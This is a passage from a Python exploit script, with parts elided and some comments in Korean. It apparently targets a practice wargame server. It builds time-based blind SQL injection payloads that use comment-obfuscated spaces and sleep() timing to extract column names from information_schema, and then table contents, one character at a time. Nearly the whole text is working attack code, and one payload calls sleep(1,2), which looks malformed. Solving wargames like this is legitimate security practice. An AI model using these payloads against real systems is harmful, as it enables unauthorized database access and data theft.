...
url = "http://wargame.catsecurity.net:19008" # change URL
...
for table_name in table : 
    for num3 in range(0,15) : 
        ...
        for num2 in range(1,30) :  # DB 이름 찾기 
            for num in range(20,127) : 
                payload = "1'/**/or/**/if(right(left((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/=\'"+table_name+"\'/**/limit/**/"+str(num3)+",1),"+str(num2)+"),1)=binary(\'"+chr(num)+"\'),sleep(1,2),1)#"
...
for table_name in table :    
    for column_name in column : 
        for num3 in range(0,15) : 
            ...
            for num2 in range(1,30) :  # DB 이름 찾기 
                for num in range(20,127) : 
                    payload = "1'/**/or/**/if(right(left(((select "+column_name+" from "+table_name+" limit "+str(num3)+",1),"+str(num2)+",1))="+str(num)+",sleep(0.9),1)#"
